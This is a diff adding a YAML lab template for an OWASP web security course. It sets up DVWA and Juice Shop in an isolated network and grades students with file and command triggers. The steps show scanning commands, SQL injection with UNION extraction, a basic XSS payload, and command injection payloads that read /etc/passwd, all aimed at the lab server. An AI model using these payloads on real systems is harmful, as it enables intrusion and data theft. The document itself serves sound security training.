@@ -1,0 +1,304 @@
+apiVersion: v1
+kind: LabTemplate
+metadata:
+  name: Web Application Security
+  description: |
+    Learn to identify and exploit common web application vulnerabilities from
+    the OWASP Top 10. This lab covers SQL injection, XSS, CSRF, authentication
+    bypasses, and secure coding practices using the DVWA platform.
+  duration: 150m
+  difficulty: intermediate
+  tags:
+    - security
+    - web
+    - owasp
+    - sql-injection
+    - xss
+    - pentesting
+  version: "1.0.0"
+  author: Kootenai Team
+  category: cybersecurity
+  instructions:
+    overview: |
+      Web applications are among the most common attack targets. This lab teaches you to
+      identify and exploit OWASP Top 10 vulnerabilities — SQL injection, XSS, command injection —
+      using DVWA and professional tools like Burp Suite. You'll also learn secure coding
+      practices to prevent these flaws.
+    learning_objectives:
+      - Enumerate web application entry points
+      - Identify and exploit SQL injection vulnerabilities
+      - Discover and demonstrate Cross-Site Scripting (XSS)
+      - Find and exploit command injection flaws
+      - Use Burp Suite to intercept and modify requests
+      - Write professional vulnerability reports
+    prerequisites:
+      - Basic understanding of HTTP and web browsers
+      - Linux command line familiarity
+      - Completion of Vulnerability Assessment recommended
+    steps:
+      - id: recon
+        title: Web Application Reconnaissance
+        content: |
+          Discover directories, files, and entry points on the web application.
+
+          ```bash
+          # Directory brute-forcing
+          dirb http://10.23.0.80/ /usr/share/wordlists/dirb/common.txt \
+            -o ~/lab/dirb_results.txt
+
+          # Nikto web scanner
+          nikto -h http://10.23.0.80/ -o ~/lab/nikto_results.txt
+          ```
+      - id: sql-injection
+        title: SQL Injection Discovery
+        content: |
+          Test input fields for SQL injection vulnerabilities.
+
+          ```bash
+          # Test with a single quote to trigger SQL errors
+          curl "http://10.23.0.80/vulnerabilities/sqli/?id=1'&Submit=Submit"
+
+          # Document the finding
+          echo "SQL injection found in id parameter" > ~/lab/sqli_found.txt
+          echo "Input: 1' causes SQL error" >> ~/lab/sqli_found.txt
+          ```
+      - id: sql-extraction
+        title: SQL Injection Data Extraction
+        content: |
+          Use UNION-based injection to extract database information.
+
+          ```bash
+          # Determine column count
+          # id=1' ORDER BY 1-- works, ORDER BY 3-- fails → 2 columns
+
+          # Extract database name
+          curl "http://10.23.0.80/vulnerabilities/sqli/?id=1' UNION SELECT database(),2--&Submit=Submit"
+
+          # Document extracted data
+          echo "database: dvwa" > ~/lab/sqli_data.txt
+          ```
+      - id: xss
+        title: Cross-Site Scripting (XSS)
+        content: |
+          Find input fields that reflect user input without sanitization.
+
+          ```bash
+          # Test for reflected XSS
+          # In the XSS reflected page, enter: <script>alert('XSS')</script>
+
+          # Document finding
+          echo "XSS vulnerability found in name parameter" > ~/lab/xss_found.txt
+          echo "Payload: <script>alert('XSS')</script>" >> ~/lab/xss_found.txt
+          ```
+      - id: command-injection
+        title: Command Injection
+        content: |
+          Exploit fields that pass input to system commands.
+
+          ```bash
+          # The ping utility page may be vulnerable
+          # Input: 127.0.0.1; whoami
+          # This executes both ping and whoami
+
+          # Document
+          echo "command injection in ping field" > ~/lab/cmdi_exploit.txt
+          echo "Payload: 127.0.0.1; cat /etc/passwd" >> ~/lab/cmdi_exploit.txt
+          ```
+      - id: burp-suite
+        title: Intercept Requests with Burp Suite
+        content: |
+          Use Burp Suite to intercept and modify HTTP requests.
+
+          ```bash
+          # Launch Burp Suite
+          burpsuite &
+
+          # Configure browser to proxy through 127.0.0.1:8080
+          # Intercept a login request and observe the parameters
+          ```
+
+          Burp Suite lets you modify requests before they reach the server,
+          making it invaluable for testing authentication and authorization.
+      - id: reporting
+        title: Document Vulnerabilities
+        content: |
+          Create a professional vulnerability report.
+
+          ```bash
+          cat > ~/lab/vulnerability_report.md << 'EOF'
+          # Web Application Security Assessment
+
+          ## SQL Injection (Critical)
+          - Location: /vulnerabilities/sqli/ - id parameter
+          - Impact: Full database access
+          - Fix: Use parameterized queries
+
+          ## XSS (High)
+          - Location: /vulnerabilities/xss_r/ - name parameter
+          - Impact: Session hijacking, defacement
+          - Fix: Encode output, validate input
+
+          ## Command Injection (Critical)
+          - Location: /vulnerabilities/exec/ - ip parameter
+          - Impact: Remote command execution
+          - Fix: Validate input, avoid shell commands
+          EOF
+          ```
+    summary: |
+      You've identified and exploited SQL injection, XSS, and command injection vulnerabilities,
+      used Burp Suite for request interception, and documented findings professionally.
+    tips:
+      - Always test in authorized environments only (like DVWA)
+      - Start with low-security settings before increasing difficulty
+      - "The fix is always more important than the exploit — learn secure coding"
+      - Use Burp Suite's Repeater tab to iterate on injection payloads
+
+spec:
+  platform: proxmox
+
+  network:
+    segments:
+      - name: web-security-network
+        vlan: 203
+        subnet: 10.23.0.0/24
+        gateway: 10.23.0.1
+        dhcp: false
+
+  vms:
+    - name: attacker-workstation
+      template: kali-linux
+      wazuhAgent: true
+      agentConfig:
+        monitor_paths:
+          - /home/kali
+          - /var/log
+        audit_commands: true
+        realtime: true
+      resources:
+        cpu: 2
+        memory: 4096
+        disk: 40
+      networks:
+        - segment: web-security-network
+          ip: 10.23.0.10
+      snapshots:
+        - name: initial
+          description: Kali with Burp Suite, OWASP ZAP installed
+          default: true
+
+    - name: dvwa-server
+      template: ubuntu-22.04-server
+      resources:
+        cpu: 2
+        memory: 2048
+        disk: 20
+      networks:
+        - segment: web-security-network
+          ip: 10.23.0.80
+      snapshots:
+        - name: dvwa-configured
+          description: DVWA application installed and configured
+          default: true
+
+    - name: juice-shop
+      template: ubuntu-22.04-server
+      resources:
+        cpu: 2
+        memory: 2048
+        disk: 20
+      networks:
+        - segment: web-security-network
+          ip: 10.23.0.81
+      snapshots:
+        - name: juice-shop-running
+          description: OWASP Juice Shop running
+          default: true
+
+  checkpoints:
+    enabled: true
+    pass_threshold: 70
+    allow_retry: true
+    show_hints: true
+    realtime_update: true
+
+  objectives:
+    - id: recon-webapp
+      description: Enumerate the web application and identify entry points
+      points: 10
+      hint: "Use dirb, gobuster, or nikto to discover directories and files"
+      order: 1
+      triggers:
+        - type: command_executed
+          target: attacker-workstation
+          match:
+            pattern: "dirb|gobuster|nikto"
+
+    - id: sql-injection-discovery
+      description: Identify a SQL injection vulnerability in DVWA
+      points: 15
+      hint: "Test input fields with single quotes to trigger SQL errors"
+      order: 2
+      triggers:
+        - type: file_content
+          target: attacker-workstation
+          match:
+            path: /home/kali/lab/sqli_found.txt
+            contains: "SQL"
+
+    - id: sql-injection-exploit
+      description: Extract database information using SQL injection
+      points: 20
+      hint: "Use UNION-based or error-based injection to extract data"
+      order: 3
+      triggers:
+        - type: file_content
+          target: attacker-workstation
+          match:
+            path: /home/kali/lab/sqli_data.txt
+            contains: "database"
+
+    - id: xss-discovery
+      description: Find and exploit a Cross-Site Scripting vulnerability
+      points: 15
+      hint: "Try injecting <script>alert('XSS')</script> in input fields"
+      order: 4
+      triggers:
+        - type: file_content
+          target: attacker-workstation
+          match:
+            path: /home/kali/lab/xss_found.txt
+            contains: "XSS"
+
+    - id: command-injection
+      description: Discover and exploit a command injection vulnerability
+      points: 20
+      hint: "Look for fields that might execute system commands (ping, etc.)"
+      order: 5
+      triggers:
+        - type: file_content
+          target: attacker-workstation
+          match:
+            path: /home/kali/lab/cmdi_exploit.txt
+            contains: "command"
+
+    - id: burp-intercept
+      description: Use Burp Suite to intercept and modify a request
+      points: 10
+      hint: "Configure browser proxy and intercept login or form submission"
+      order: 6
+      triggers:
+        - type: command_executed
+          target: attacker-workstation
+          match:
+            pattern: "burpsuite|java.*burp"
+
+    - id: security-report
+      description: Document all vulnerabilities with remediation advice
+      points: 10
+      hint: "Include vulnerability type, location, impact, and fix"
+      order: 7
+      triggers:
+        - type: file_exists
+          target: attacker-workstation
+          match:
+            path: /home/kali/lab/vulnerability_report.md
